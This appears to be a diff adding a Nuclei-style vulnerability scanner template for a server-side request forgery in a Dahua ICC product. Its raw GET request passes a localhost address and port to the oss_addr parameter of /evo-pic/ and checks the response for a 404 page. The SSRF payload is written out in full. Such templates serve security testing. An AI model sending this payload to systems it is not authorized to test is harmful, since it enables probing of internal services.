@@ -1,0 +1,17 @@
+id: Dahua_ICC_SSRF
+info:
+  name: Dahua_ICC_SSRF
+  author: test
+  severity: high
+
+http:
+  - raw:
+      - |
+        GET /evo-pic/?oss_addr=127.0.0.1:8009/ HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code_1==404  && contains_all(body_1,"HTTP Status 404")
